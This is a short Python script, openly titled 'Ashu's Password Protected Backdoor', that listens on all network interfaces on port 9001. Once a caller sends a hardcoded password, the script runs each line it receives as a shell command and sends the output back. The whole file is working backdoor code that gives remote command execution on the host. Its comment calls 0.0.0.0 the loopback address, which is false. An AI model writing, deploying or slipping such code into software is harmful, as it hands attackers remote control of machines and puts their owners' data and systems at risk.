#!/usr/bin/env python3

import socket
import os
import subprocess
import traceback
import threading
from socket import error as SocketError
import errno

LOCALHOST = '0.0.0.0'  # Standard loopback interface address (localhost)
PORT = 9001       # Port to listen on (non-privileged ports are > 1023)
banner = (b"""
================================================
      Ashu's Password Protected Backdoor
================================================

""")
class ClientThread(threading.Thread):
    def __init__(self,clientAddress,clientsocket):
        threading.Thread.__init__(self)
        self.csocket = clientsocket
        print ("New connection added: ", clientAddress)
    def run(self):
        print('Connected by', clientAddress)
        while True:
            self.csocket.send(banner)
            while True:
                data = self.csocket.recv(1024)
                if data.decode() == "yourmom!\n":
                    self.csocket.send(b"Correct Password!\n")
                    while True:
                        data = self.csocket.recv(1024)
                        self.csocket.send(b"Command: " + data)
                        command = data.decode()
                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
                        output = proc.stdout.read()
                        self.csocket.send(bytes(output))
                else:
                    self.csocket.send(b"Password Incorrect\n")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((LOCALHOST, PORT))
print("Server started")
print("Waiting for clients to connect...")

while True:
    s.listen(1000)
    clientsock, clientAddress = s.accept()
    newthread = ClientThread(clientAddress, clientsock)
    newthread.start()

